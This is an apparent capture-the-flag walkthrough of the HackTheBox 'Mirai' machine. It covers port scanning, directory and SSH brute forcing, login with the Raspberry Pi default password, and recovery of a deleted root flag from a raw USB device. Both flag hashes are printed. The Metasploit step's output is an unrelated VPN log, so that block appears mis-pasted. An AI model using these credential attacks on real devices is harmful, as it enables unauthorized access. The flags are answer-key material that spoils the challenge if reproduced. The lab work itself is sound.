# MACHINE CHALLENGE: MIRAI

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.48
OS: Linux
```

### NAME OF THE MACHINE AS A HINT?

```
https://en.wikipedia.org/wiki/Mirai_(malware)
```
```
Mirai (Japanese for "the future", 未来) is a malware that turns networked
devices running Linux into remotely controlled "bots" that can be used as part
of a botnet in large-scale network attacks.
<...>
Mirai then identifies vulnerable IoT devices using a table of more than 60 common
factory default usernames and passwords
```

Okay.. so seems like it has something to do with default passwords for an IoT
device?

### PORTSCANNING w/ NMAP

Use `nmap` to see if we can detect what services our host is offering, what
operating system (and version) our host is running, what type of packet
filters/firewalls are in use, etc.

```
$ sudo nmap -A -sS -T4 10.10.10.48

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-16 13:25 EST
Nmap scan report for 10.10.10.48
Host is up (0.36s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
53/tcp   open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp   open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.9)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.9
|_http-title: Directory listing for /
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=12/16%OT=22%CT=1%CU=43221%PV=Y%DS=2%DC=T%G=Y%TM=5A3565
OS:51%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)SEQ(SP=
OS:105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%II=I
OS:%TS=8)OPS(O1=M54BST11NW6%O2=M54BST11NW6%O3=M54BNNT11NW6%O4=M54BST11NW6%O
OS:5=M54BST11NW6%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   396.05 ms 10.10.16.1
2   192.08 ms 10.10.10.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.88 seconds
```

So we have 4 open services running - ssh(22), dns(53), http(80), http(8000).

### ENUMERATING PORT 80 (HTTP)

Visiting the webpage we see nothing. Attempting to enumerate through directory
bruteforcing using `gobuster`..

```
$ gobuster -e -u 10.10.10.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.48/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.48/admin (Status: 301)
http://10.10.10.48/versions (Status: 200)
```

Found something called "Pi-hole Admin Console" running at `10.10.10.48:80/admin`.
Pi-hole claims to be a "black hole for Internet advertisements"?

```
http://10.10.10.48/admin
```

<img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/machines/mirai/pi-hole-admin.jpg" width=500px/>

```
*Pi-hole can protect your network from malware*
You can add additional block lists to your installation that will prevent domains that are
known to serve malware or act as a phishing site from ever entering your network.
```

On the admin console, I see an option to login that requests just a password,
no username.

```
http://10.10.10.48/admin/index.php?login
```

<img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/machines/mirai/pi-hole-login.jpg" width=500px/>

Under "forgot password", I see that you can `ssh` into the machine and run the
following command to reset your password (apparently no way to recover the
password that is provided during installation).

```
$ sudo pihole -a -p
```

Not sure if this is leading anywhere..

### ENUMERATING PORT 22 (SSH)

So let's turn our attention to SSH and Port 22 and see if we can brute force
our way in or discover any useful information about it..

##### METASPLOIT

```
$ sudo service postgresql start
$ sudo msfdb init
$ msfconsole
msf > db_status
[*] postgresql connected to msf

msf > use auxiliary/scanner/ssh/ssh_login

msf auxiliary(ssh_login) > set RHOSTS 10.10.10.48
RHOSTS => 10.10.10.48

msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

msf auxiliary(ssh_login) > set VERBOSE false
VERBOSE => false

msf auxiliary(ssh_login) > services -p 22 -u -R

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.48  22    tcp    ssh   open   SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3

RHOSTS => 10.10.10.48

msf auxiliary(ssh_login) > run
Tue Dec 19 17:32:24 2017 TLS: soft reset sec=0 bytes=33406651/-1 pkts=216009/0
Tue Dec 19 17:32:24 2017 VERIFY OK: depth=1, C=UK, ST=City, L=London, O=HackTheBox, CN=HackTheBox CA, name=htb, emailAddress=info@hackthebox.gr
Tue Dec 19 17:32:24 2017 VERIFY KU OK
Tue Dec 19 17:32:24 2017 Validating certificate extended key usage
Tue Dec 19 17:32:24 2017 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
Tue Dec 19 17:32:24 2017 VERIFY EKU OK
Tue Dec 19 17:32:24 2017 VERIFY OK: depth=0, C=UK, ST=City, L=London, O=HackTheBox, CN=htb, name=htb, emailAddress=info@hackthebox.gr
Tue Dec 19 17:32:25 2017 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue Dec 19 17:32:25 2017 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue Dec 19 17:32:25 2017 Control Channel: TLSv1.2, cipher TLSv1/SSLv3 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Okay, so our brute force failed using that dictionary list. What next?

##### RASPBERRY PI??

Read on a forum that "Pi-hole" and "Mirai" were hints.. so eventually ended up
trying the default `ssh` password for a Raspberry Pi device and wouldn't you
know it, it worked! `(user: pi defaultpasswd: raspberry)`

```
https://www.raspberrypi.org/documentation/remote-access/ssh/unix.md
```

````
$ ssh pi@10.10.10.48
pi@10.10.10.48's password: raspberry

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 19 23:14:27 2017 from 10.10.15.14

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```

Ended up trying to reset the admin password for Pi-hole and poking around, but
that didn't seem to lead me anywhere. Maybe Pi-hole's sole purpose was to
provide the Raspberry Pi hint?

```
$ sudo pihole -a -p
Enter New Password (Blank for no password): 
Confirm Password: 
New password set
````

### OWN USER

Well, at least now that we are inside the machine, let's see if we can recover
the secret hash that is supposed to be in the "user.txt" file on the machine
either at `/home/pi` or on the Desktop of our user `pi`.

```
pi@raspberrypi:~ $ cat Desktop/user.txt
ff837707441b257a20e32199d7c8838d
```

Nice.. that worked.

### OWN MACHINE

Now all that is left it seems is to some how obtain root priviledge so that we
can get at the "root.txt" file that should either be under `/root` or the
Desktop of the `Administrator` user.

```
$ ls -ld root
drwx------ 3 root root 4096 Aug 27 14:47 root
$ sudo ls /root
root.txt
$ sudo cp /root/root.txt .
pi@raspberrypi:/ $ cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

Interesting.. okay, so now we have to go looking for something about a USB
stick??? Looking under the `/media` directory, we do find a device called `usbstick`..

```
$ cat /media/usbstick/damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Okay.. so seems like this is where the file was.. but has been deleted? Let's
see what device is mounted to `/media/usbstick`..

```
$ mount | grep usb
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
```

Found some tool called `debugfs` that could be used..

```
$ sudo debugfs -w /dev/sdb
debugfs 1.42.12 (29-Aug-2014)
debugfs:  lsdel
 Inode  Owner  Mode    Size      Blocks   Time deleted
0 deleted inodes found.
```

.. but that doesn't yield anything :-(. In a bit of wild-ass-guess-ery, tried
the strings command on the device to see if anything pops out and wouldn't you
know it.. something that looks like the hash!

```
$ sudo cat /dev/sdb | strings
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

### REFERENCES
https://v3ded.github.io/ctf/htb-blocky.html
